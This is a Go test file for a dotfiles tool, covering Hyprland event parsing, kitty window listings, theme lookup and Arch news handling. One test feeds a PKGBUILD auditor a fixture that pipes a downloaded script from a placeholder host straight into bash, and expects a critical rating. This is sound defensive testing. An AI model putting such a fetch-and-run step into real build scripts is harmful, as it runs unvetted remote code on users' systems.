package dotfiles

import (
	"context"
	"os"
	"path/filepath"
	"reflect"
	"testing"
)

func TestHyprParseEventLine(t *testing.T) {
	event := hyprParseEventLine("workspace>>1,web")
	if event.Name != "workspace" {
		t.Fatalf("expected workspace event, got %#v", event)
	}
	if event.Data != "1,web" {
		t.Fatalf("expected data payload, got %#v", event)
	}
	if event.Raw != "workspace>>1,web" {
		t.Fatalf("expected raw line to be preserved, got %#v", event)
	}
}

func TestTrimTailLines(t *testing.T) {
	got := trimTailLines("a\nb\nc\nd\n", 2)
	if got != "c\nd" {
		t.Fatalf("trimTailLines returned %q", got)
	}
}

func TestKittySummariesFromLS(t *testing.T) {
	raw := `[{"id":11,"tabs":[{"id":21,"title":"main","layout":"tall","is_active":true,"windows":[{"id":31,"title":"shell","is_active":true,"pid":99,"cwd":"/tmp","cmdline":["bash"]},{"id":32,"title":"logs","pid":100,"current_working_directory":"/var/log","cmdline":["tail","-f"]}]}]}]`
	tabs, windows, osWindows, err := kittySummariesFromLS(raw)
	if err != nil {
		t.Fatalf("kittySummariesFromLS error: %v", err)
	}
	if osWindows != 1 {
		t.Fatalf("expected one OS window, got %d", osWindows)
	}
	if len(tabs) != 1 || tabs[0].WindowCount != 2 || tabs[0].Layout != "tall" {
		t.Fatalf("unexpected tab summaries: %#v", tabs)
	}
	if len(windows) != 2 {
		t.Fatalf("unexpected window count: %#v", windows)
	}
	if windows[0].Cwd != "/tmp" || !reflect.DeepEqual(windows[0].Cmdline, []string{"bash"}) {
		t.Fatalf("unexpected first window summary: %#v", windows[0])
	}
}

func TestResolveKittyThemeFileLocal(t *testing.T) {
	dir := t.TempDir()
	kittyDir := filepath.Join(dir, "kitty")
	if err := os.MkdirAll(kittyDir, 0o755); err != nil {
		t.Fatalf("mkdir kitty dir: %v", err)
	}
	themePath := filepath.Join(kittyDir, "snazzy.conf")
	if err := os.WriteFile(themePath, []byte("foreground #ffffff\n"), 0o644); err != nil {
		t.Fatalf("write theme file: %v", err)
	}
	t.Setenv("DOTFILES_DIR", dir)
	got, cleanup, err := resolveKittyThemeFile("snazzy", "")
	if cleanup != nil {
		defer cleanup()
	}
	if err != nil {
		t.Fatalf("resolveKittyThemeFile error: %v", err)
	}
	if got != themePath {
		t.Fatalf("expected %s, got %s", themePath, got)
	}
}

func TestArchCleanHTML(t *testing.T) {
	got := archCleanHTML("<p>Hello <code>kitty</code> world</p>")
	if got != "Hello kitty world" {
		t.Fatalf("unexpected cleaned HTML: %q", got)
	}
}

func TestArchNewsCriticalReasons(t *testing.T) {
	item := archNewsItem{Title: "iptables now defaults to the nft backend", Summary: "Most setups should work unchanged, but users relying on uncommon xtables extensions should test carefully."}
	critical, reasons := archNewsCriticalReasons(item, []string{"iptables"})
	if !critical {
		t.Fatal("expected critical news match")
	}
	if len(reasons) == 0 {
		t.Fatal("expected at least one critical reason")
	}
}

func TestArchAuditPKGBUILDInline(t *testing.T) {
	out, err := archAuditPKGBUILD(context.Background(), ArchPkgbuildAuditInput{
		PKGBUILD: `
pkgname=test
install=test.install
prepare() {
  curl -L https://example.com/install.sh | bash
}`,
	})
	if err != nil {
		t.Fatalf("archAuditPKGBUILD error: %v", err)
	}
	if out.RiskLevel != "critical" {
		t.Fatalf("expected critical risk, got %#v", out)
	}
	if len(out.Findings) == 0 {
		t.Fatalf("expected findings, got %#v", out)
	}
}
